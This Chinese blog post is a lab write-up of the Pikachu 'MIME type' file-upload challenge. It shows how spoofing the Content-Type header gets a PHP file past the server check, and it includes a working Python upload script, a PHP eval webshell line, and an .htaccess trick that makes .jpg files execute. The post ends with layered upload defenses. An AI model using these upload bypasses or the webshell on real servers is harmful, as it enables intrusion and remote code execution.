---
layout: post
title: Pikachu - Unsafe Fileupload MIME type Writeup（校验标签而不是内容）
platform: pikachu
date: 2026-10-29 20:23:00 +0800
categories: CTF
---

Pikachu - Unsafe Fileupload MIME type Writeup（校验标签而不是内容）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Unsafe Fileupload → MIME type
- 地址：`http://localhost/pikachu/vul/unsafeupload/servercheck.php`
- 题型：Web
- 考点：**MIME type 校验绕过**、`$_FILES['type']` 的不可信性

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
上传目录：D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\
访问 URL：http://localhost/pikachu/vul/unsafeupload/uploads/<文件名>
```

**页面形态**：

```text
这里只允许上传图片，不要乱搞!

[选择文件] 未选择文件
[开始上传]
```

**作者提示**：

```html
data-content="MIME type了解一下"
```

**✅ 实测结果（4 种组合）**

| # | 文件名 | Content-Type | 结果 |
|---|---|---|---|
| 1 | `mime_probe.php` | `application/octet-stream` | ❌ **被拒绝**：`上传的图片只能是jpg,jpeg,png格式的！` |
| 2 | **`mime_probe.php`** | **`image/png`** | **✅ 上传成功 → `uploads/mime_probe.php`** |
| 3 | `real.gif`（真 GIF）| `image/gif` | ❌ **也被拒绝**（`image/gif` 不在白名单！）|
| 4 | **`mime_probe2.php`** | **`image/jpeg`** | **✅ 上传成功** |

**★ 第 2 步访问验证**：

```
GET http://localhost/pikachu/vul/unsafeupload/uploads/mime_probe.php
→ HTTP 200
→ MIME_BYPASS_OK | php=7.3.4
```

**★ 代码执行成功。**

二、题目分析

**① 源码：服务端终于有校验了**

```php
<?php
// servercheck.php 第 18-28 行
if(isset($_POST['submit'])){
    $mime = array('image/jpg', 'image/jpeg', 'image/png');   // ★ MIME 白名单
    $save_path = 'uploads';
    $upload = upload_sick('uploadfile', $mime, $save_path);  // 调用"带 MIME 校验"的函数
    if($upload['return']){
        $html .= "<p class='notice'>文件上传成功</p>
                  <p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html .= "<p class=notice>{$upload['error']}</p>";
    }
}
?>
```

```php
<?php
// inc/uploadfunction.php — upload_sick() 第 63-84 行
// 验证一下MIME类型
if(!in_array($_FILES[$key]['type'], $mime)){
    $return_data['error'] = '上传的图片只能是jpg,jpeg,png格式的！';
    $return_data['return'] = false;
    return $return_data;
}

// ... 创建目录 ...

// ★ 依然用【原始文件名】保存，没有检查扩展名
if(!move_uploaded_file($_FILES[$key]['tmp_name'], $save_path . $_FILES[$key]['name'])){
    ...
}
$return_data['new_path'] = $save_path . $_FILES[$key]['name'];
?>
```

**★ 和上一关（client check）的对比**：

| | client check | **MIME type（本关）** |
|---|---|---|
| 校验位置 | **前端 JS** | **服务端 PHP** |
| 校验什么 | 文件扩展名 | **`$_FILES['type']`（Content-Type）** |
| 校验依据 | 文件名 | **HTTP 请求头里的一行** |
| 绕过方式 | 直接发请求 | **伪造 Content-Type** |
| 是否检查扩展名 | ❌ | ❌ **也没检查** |
| 是否检查内容 | ❌ | ❌ **也没检查** |

**★ 所以本关只多了"一个请求头的校验"，其他依然敞开。**

**② ⭐ 核心认知：`$_FILES['type']` 完全来自客户端**

**★ 这是本关最重要的知识点。**

**★ 一个 multipart 请求长这样**：

```http
POST /pikachu/vul/unsafeupload/servercheck.php HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----B123

------B123
Content-Disposition: form-data; name="uploadfile"; filename="mime_probe.php"
Content-Type: image/png                                    ← ★ 就是这一行
                                                           客户端写的
(文件内容：<?php echo "MIME_BYPASS_OK"; ?>)
------B123--
```

**★ PHP 做的事**：

```php
$_FILES['uploadfile'] = [
    'name'     => 'mime_probe.php',      // 来自 filename="..."
    'type'     => 'image/png',           // ★ 来自 Content-Type: ...
    'tmp_name' => 'D:\...\php1234.tmp',  // 服务器自己生成的临时文件
    'error'    => 0,
    'size'     => 51,
];
```

**★ 关键点**：

```
'name' → 客户端写的（filename="..."）
'type' → 客户端写的（Content-Type: ...）
'tmp_name' → 服务器自己生成的（可信）
'error' / 'size' → 服务器自己算的（可信）

★ 所以 ['type'] 是"客户端说了算"的字段
★ 校验它 = 校验"客户端的一句话"
```

**★ PHP 不做的三件事**：

```
❌ 不检查 Content-Type 和文件内容是否匹配
❌ 不检查文件到底是什么格式
❌ 不重新识别 MIME 类型
★ 它只是"如实转述"客户端说的话
```

**★ 所以这个校验的本质是**：

```
"你说你是图片，那就算你是图片"
★ 伪造一个请求头就过了
```

**③ ⭐ 一个反直觉的发现：真的 GIF 反而被拒绝**

**★ 实测第 3 步**：

```
文件名：real.gif（真正的 1x1 GIF）
Content-Type：image/gif
→ ❌ 上传的图片只能是jpg,jpeg,png格式的！
```

**★ 为什么？看白名单**：

```php
$mime = array('image/jpg', 'image/jpeg', 'image/png');
                          └────┬────┘
                     ★ 没有 image/gif！
```

**★ 这说明两件事**：

```
① 白名单"写漏了"
   → 正常的 GIF 图片传不上去
   → 影响了正常功能

② 校验的是"标签"，不是"内容"
   内容是真的 GIF → 因为标签不在白名单 → 被拒
   内容是 PHP 代码 → 因为标签是 image/png → 通过
   ★ 完全本末倒置
```

**★ 还有一个细节：`image/jpg` 其实是"错的" MIME 类型**

```
标准里 JPEG 的类型是 image/jpeg
image/jpg 是"非标准"写法（虽然有些场景能用）

★ 浏览器上传 .jpg 文件时，发的 Content-Type 是 image/jpeg
★ 所以白名单里的 'image/jpg' 永远匹配不到 → 是"死条目"
★ 白名单里真正生效的只有 'image/jpeg' 和 'image/png'
```

**★ 这就是"白名单写错"的经典案例**：

```
· 多写了一个不存在的值（image/jpg）→ 无害但无用
· 少写了一个需要的值（image/gif）→ 影响功能
★ 白名单的"完备性"很重要
```

**④ 为什么"校验 Content-Type"不算真正的安全措施**

**★ 一句话**：

```
Content-Type 是"客户端对自己发的东西的描述"
不是"文件本身的属性"

★ 描述可以撒谎，属性不会
```

**★ 类比**：

```
你收到一个包裹，外面写着"里面是书"
· 看一眼标签就收货 → 收到炸弹
· 打开看看里面是什么 → 才知道真相（这才是 getimagesize / finfo）

★ 本关的做法 = 看一眼标签
★ 正确做法 = 打开看看（校验文件内容）
```

**★ 所以服务端校验的"正确顺序"**：

```
① 校验扩展名（白名单）
② 校验文件内容（getimagesize / finfo_file）
③ 重命名（随机名 + 安全后缀）
④ 上传目录禁止执行
★ 四步都要做，缺一不可
```

三、解题步骤

**第 1 步：先确认"正常 PHP 会被拦"**

**★ 方式 A：用 Burp**

```text
① 准备一个 1.php（内容 <?php echo "OK"; ?>）
② 上传 → Burp 抓包，看到：
       Content-Disposition: form-data; name="uploadfile"; filename="1.php"
       Content-Type: application/octet-stream        ← ★ 浏览器自动判断的
③ Forward
④ 响应："上传的图片只能是jpg,jpeg,png格式的！"
```

**★ 为什么浏览器给的是 `application/octet-stream`？**

```
浏览器按【文件扩展名】猜 Content-Type
.php 不是它认识的类型 → 默认 application/octet-stream
★ 不在白名单（image/jpg, image/jpeg, image/png）→ 被拒
```

**★ 方式 B：用 Python（我用的这个）**

```python
# Content-Type: application/octet-stream
→ ❌ 被拒绝
```

**第 2 步：⭐ 改 Content-Type（绕过）**

**★ Burp 里改这一行**：

```http
- Content-Type: application/octet-stream
+ Content-Type: image/png
```

**★ 然后 Forward。**

**★ 响应**：

```
文件上传成功
文件保存的路径为：uploads/1.php
```

**★ 绕过成功。**

**★ 用 Python 更直接**：

```python
import uuid
import urllib.request

URL = "http://localhost/pikachu/vul/unsafeupload/servercheck.php"
CONTENT = b'<?php echo "MIME_BYPASS_OK | php=".phpversion(); ?>'

b = "----B" + uuid.uuid4().hex[:10]
body  = ("--%s\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n开始上传\r\n" % b).encode()
body += ("--%s\r\nContent-Disposition: form-data; name=\"uploadfile\"; "
         "filename=\"probe.php\"\r\n"
         "Content-Type: image/png\r\n\r\n" % b).encode()      # ★ 唯一的"技巧"
body += CONTENT + b"\r\n"
body += ("--%s--\r\n" % b).encode()

req = urllib.request.Request(URL, data=body, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=" + b})
print(urllib.request.urlopen(req).read().decode("utf-8", "replace"))
```

**★ 实测输出**：

```html
<p class='notice'>文件上传成功</p>
<p class='notice'>文件保存的路径为：uploads/mime_probe.php</p>
```

**第 3 步：访问上传的文件（验证执行）**

```
http://localhost/pikachu/vul/unsafeupload/uploads/mime_probe.php
```

**★ 实测结果**：

```
MIME_BYPASS_OK | php=7.3.4
```

**★ 到这里 getshell 链就通了。**

**第 4 步：验证"真 GIF 被拒"（理解白名单 bug）**

```python
# 1x1 的真 GIF
GIF = bytes.fromhex("47494638396101000100800000ffffff00000021f90401000000002c00000000010001000002024401003b")
# Content-Type: image/gif
→ ❌ 被拒绝（image/gif 不在白名单）
```

**★ 这个"反直觉"的实验能帮你看清热白名单的实际内容。**

**第 5 步：其它白名单值也都能用**

**★ 试 `image/jpeg`**：

```python
"Content-Type: image/jpeg"
→ ✅ 上传成功 → uploads/mime_probe2.php
```

**★ 试 `image/jpg`（那个"死条目"）**：

```python
"Content-Type: image/jpg"
→ ✅ 也能上传成功（因为它在白名单里）
★ 但浏览器永远不会发这个值 → 说明白名单是"人工写的"
```

**第 6 步：完整 payload 汇总**

```http
// ========== 被拒绝 ==========
Content-Type: application/octet-stream
Content-Type: image/gif

// ========== 白名单内（可绕过）==========
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/jpg

// ========== 文件内容（随便写 PHP）==========
<?php echo "MIME_BYPASS_OK"; ?>
<?php @eval($_POST['cmd']); ?>          ← 真正的 webshell（慎用）
```

**第 7 步：清理（需要管理员权限）**

```powershell
# 以管理员身份打开 PowerShell
Remove-Item "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\*" -Force
```

**★ 因为 uploads 里的文件所有者是 `BUILTIN\Administrators`（phpstudy 高权限跑 Apache），普通用户删不了。**

四、延伸知识

**① MIME type 基础知识**

**★ MIME type（也叫 Media Type）的格式**：

```
type/subtype

image/png          PNG 图片
image/jpeg         JPEG 图片
image/gif          GIF 图片
text/plain         纯文本
text/html          HTML
application/json   JSON
application/pdf    PDF
application/octet-stream   未知二进制（默认值）
```

**★ 常见文件 → MIME 对照表**：

| 扩展名 | 正确的 MIME | 浏览器常发的 |
|---|---|---|
| `.jpg` / `.jpeg` | `image/jpeg` | `image/jpeg` |
| `.png` | `image/png` | `image/png` |
| `.gif` | `image/gif` | `image/gif` |
| `.php` | `text/x-php`（不标准）| `application/octet-stream` |
| `.txt` | `text/plain` | `text/plain` |
| `.html` | `text/html` | `text/html` |

**★ 注意 `image/jpg` 是"不标准"的**：

```
标准：image/jpeg
不标准：image/jpg（有人这么写，但不是规范）
★ 本关白名单里同时写了两个 → 是"保险"写法，但 image/jpg 永远用不上
```

**② 浏览器怎么决定 Content-Type**

**★ 上传文件时**：

```
浏览器按【文件扩展名】查"系统注册表 / mime.types"
→ 找到对应类型就用它
→ 找不到就用 application/octet-stream
★ 完全基于"文件名"，不看内容
```

**★ 这意味着**：

```
把 shell.php 改名 shell.jpg → 浏览器发 image/jpeg
★ 这就是"改名过前端校验"的原理（上一关的技巧）
★ 但服务器可能又把后缀改回来 → 所以要"抓包改 filename"
```

**③ 服务端怎么"正确"判断文件类型**

**★ 方法 1：`finfo_file()`（最准，读文件头魔数）**

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['uploadfile']['tmp_name']);
finfo_close($finfo);

if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'], true)) {
    die('不是合法的图片');
}
```

**★ 和 `$_FILES['type']` 的区别**：

```
$_FILES['type']    → 客户端说是什么（可伪造）
finfo_file()       → 读文件内容判断（不可伪造）
```

**★ 方法 2：`getimagesize()`（专用于图片）**

```php
$info = @getimagesize($_FILES['uploadfile']['tmp_name']);
if ($info === false || !in_array($info[2], [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF], true)) {
    die('不是合法的图片');
}
```

**★ 两者都能防住"纯 PHP 文件"，但防不住"图片马"**：

```
图片马 = [真图片头] + [PHP 代码]
finfo / getimagesize 看文件头 → 判定"是图片" ✅
PHP 执行时看全文 → 找到 <?php → 执行 ⚠️
★ 所以还需要"上传目录禁止执行"
```

**④ Content-Type 在其它地方的作用**

**★ 它会出现在很多安全场景里**：

**场景 1：JSON API**

```http
POST /api/login
Content-Type: application/json

{"username":"admin","password":"123"}
```

**★ 如果后端只认 `application/json`**：

```
改成 Content-Type: text/plain → 后端可能解析失败
★ 这是"CSRF 防护"的一种（跨站请求无法设置自定义 Content-Type）
```

**场景 2：文件下载**

```php
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename=x.pdf');
```

**★ 强制"下载"而不是"显示"**（防止浏览器解析 HTML → XSS）。

**场景 3：SSRF 的绕过**

```
有些 SSRF 防护只允许 http:// 且"内容类型是 text/html"
→ 可以伪造 Content-Type 绕过
```

**场景 4：XXE**

```
XML 外部实体注入需要 Content-Type: text/xml 或 application/xml
★ 有些后端按 Content-Type 决定"是否解析 XML"
```

**⑤ 防御（五层）**

**❌ 本关的做法（只校验 Content-Type）**：

```php
if(!in_array($_FILES[$key]['type'], $mime)){ die('只允许图片'); }
move_uploaded_file($tmp, $save_path . $_FILES[$key]['name']);
```

**✅ 第 1 层：扩展名白名单**

```php
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext, true)) {
    die('扩展名不允许');
}
```

**✅ 第 2 层：内容校验（finfo / getimagesize）**

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $_FILES['f']['tmp_name']);
finfo_close($finfo);

if (!in_array($real_mime, ['image/jpeg', 'image/png', 'image/gif'], true)) {
    die('文件内容不是图片');
}
```

**★ 注意**：

```
不要用 $_FILES['type']（客户端的）
要用 finfo_file / getimagesize（读内容的）
```

**✅ 第 3 层：重命名（不让攻击者控制文件名）**

```php
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
// 或者：$new_name = md5(uniqid() . mt_rand()) . '.' . $ext;
```

**★ 好处**：

```
· 攻击者不知道文件名 → 无法访问
· 无法用 .php 后缀（强制用白名单里的扩展名）
· 避免"双写 / 点空格 / ::$DATA"这些变形
```

**✅ 第 4 层：分目录存放**

```php
$save_dir = '/data/uploads/' . date('Ymd') . '/' . bin2hex(random_bytes(4)) . '/';
mkdir($save_dir, 0755, true);
// ★ 按日期 + 随机子目录
```

**✅ 第 5 层：上传目录禁止执行（最关键）**

**Nginx**：

```nginx
location ^~ /uploads/ {
    location ~ \.php$ { deny all; }
}
```

**Apache**：

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    <FilesMatch "\.(php|phtml|php3|php4|php5|phar)$">
        Require all denied
    </FilesMatch>
</Directory>
```

**★ 这一层能"一票否决" getshell**：

```
即使前 4 层全被绕过
即使 shell.php 真的传上去了
→ 访问时不会被当 PHP 执行
→ 只是一段"内容为 PHP 源码的文本文件"
★ 攻击失败
```

**⑥ 本关在真实世界的对应**

**★ "只校验 Content-Type"是极常见的错误**：

```
· 很多 CMS 的头像上传："只接受 image/*"
· 很多 OA 的附件上传："检查 MIME 类型"
· 很多框架的 upload 组件：默认用 $_FILES['type']
★ 这些都是"看一眼标签就收货"
```

**★ 真实案例**：

```
· 某次 HW：某 OA 的头像上传只查 Content-Type
  → 改包上传 .php → getshell
  
· 某次渗透：某系统用 $_FILES['type'] 判断
  → 上传 .htaccess（Content-Type: image/png）→ 让 .jpg 也执行 PHP
```

**★ 一个进阶技巧：上传 `.htaccess`**

```apache
# .htaccess 内容
AddType application/x-httpd-php .jpg
```

**★ 如果目标用 Apache + AllowOverride All**：

```
① 上传 .htaccess（Content-Type 伪造成 image/png）
② 再上传 shell.jpg
③ .jpg 被当 PHP 执行 → getshell
★ 这是"不检查扩展名"的进阶利用
```

五、总结

- **本题核心：服务端用 `$_FILES['type']`（客户端的 Content-Type）做校验，而这个值完全由客户端决定 → 伪造请求头就能绕过。**

- **两段关键代码**：

```php
// servercheck.php
$mime = array('image/jpg', 'image/jpeg', 'image/png');
$upload = upload_sick('uploadfile', $mime, 'uploads');
```

```php
// uploadfunction.php — upload_sick()
if(!in_array($_FILES[$key]['type'], $mime)){        // ★ 校验的是"客户端说的话"
    $return_data['error'] = '上传的图片只能是jpg,jpeg,png格式的！';
    return $return_data;
}
...
move_uploaded_file($tmp, $save_path . $_FILES[$key]['name']);   // 仍然用原始文件名
```

- **⭐ 八个必记要点**：

```text
① $_FILES['type'] 完全来自客户端
   multipart 里的 "Content-Type: xxx" 那一行
   ★ PHP 只是如实转述，不校验内容是否匹配

② 校验"标签" ≠ 校验"内容"
   真 GIF（image/gif）→ 被拒（不在白名单）
   PHP 代码（image/png）→ 通过
   ★ 完全本末倒置

③ 实测：伪造 Content-Type 就绕过
   改一行 image/png → 上传成功 → 访问 → 代码执行

④ 白名单写错的经典案例
   · image/jpg 是"不标准"类型，浏览器永远不发 → 死条目
   · 漏了 image/gif → 真 GIF 传不上去
   ★ 白名单的"完备性"很重要

⑤ 和上一关（client check）的关系
   client check：前端查扩展名 → 后端零校验
   MIME type：后端查 Content-Type → 但仍不查扩展名和内容
   ★ 都只是"一层纸"

⑥ 正确的校验方式是"读内容"
   finfo_file()（魔数）或 getimagesize()（图片头）
   ★ 这两个防得住"纯 PHP"，但防不住"图片马"

⑦ 完整防御要五层
   扩展名白名单 + 内容校验 + 重命名 + 分目录 + 禁止执行
   ★ 最后一层"禁止执行"是底线

⑧ 进阶利用：上传 .htaccess
   如果 AllowOverride All → 上传 .htaccess 让 .jpg 也执行
   ★ 这是"不检查扩展名"的更深利用
```

- **实测数据**：

```text
.php + application/octet-stream  → ❌ 上传的图片只能是jpg,jpeg,png格式的！
.php + image/png                 → ✅ 成功 → uploads/mime_probe.php
.gif + image/gif                 → ❌ 被拒（image/gif 不在白名单！）
.php + image/jpeg                → ✅ 成功 → uploads/mime_probe2.php

访问 uploads/mime_probe.php：
    HTTP 200 → MIME_BYPASS_OK | php=7.3.4
```

- **进度**：

```text
platform: pikachu   33 篇

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
└── Unsafe Fileupload   2/7    ← 前端校验 + MIME 校验完成，还剩 5 关
```

**手工复现要点**：

```text
· 直接传 .php（Content-Type: application/octet-stream）→ 被拒绝
· Burp 抓包，把 Content-Type 改成 image/png → 上传成功
· 访问 uploads/1.php → 看到 PHP 执行结果
· 传一个真 GIF（image/gif）→ 也被拒绝（白名单漏了 gif）
· 用管理员 PowerShell 清理 uploads
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  MIME 校验 = 看一眼标签就收货                                  │
│                                                            │
│  $_FILES['type'] 来自请求头 "Content-Type: xxx"              │
│      → 客户端想写什么就写什么                                 │
│      → 改一行就绕过                                          │
│                                                            │
│  ★ 校验"标签" ≠ 校验"内容"                                    │
│  ★ 真 GIF 因为不在白名单被拒                                 │
│  ★ PHP 代码因为标签是 image/png 而通过                        │
│                                                            │
│  正确做法：finfo_file() / getimagesize() 读文件内容            │
│  底线：上传目录禁止执行 PHP                                    │
└────────────────────────────────────────────────────────────┘
```
